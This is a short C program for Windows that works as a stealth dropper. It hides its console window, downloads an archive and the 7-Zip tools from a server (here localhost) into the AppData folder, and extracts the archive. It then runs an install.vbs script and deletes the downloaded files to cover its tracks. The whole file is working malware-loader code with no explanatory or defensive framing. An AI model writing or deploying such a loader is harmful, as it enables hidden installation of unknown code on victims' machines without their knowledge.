#include <stdlib.h>     
#include <Windows.h>

int main()
{
  ShowWindow(GetConsoleWindow(), SW_HIDE);
  system("curl http://localhost:8000/a.zip --output %appdata%\\a.zip");
  system("curl http://localhost:8000/7z.exe --output %appdata%\\7z.exe");
  system("curl http://localhost:8000/7z.dll --output %appdata%\\7z.dll");
  system("%appdata%\\7z.exe x %appdata%\\a.zip -o%appdata%");
  system("cd %appdata%\\rs && install.vbs");
  system("del %appdata%\\a.zip");
  system("del %appdata%\\7z.exe");
  system("del %appdata%\\7z.dll");

  return 0;
}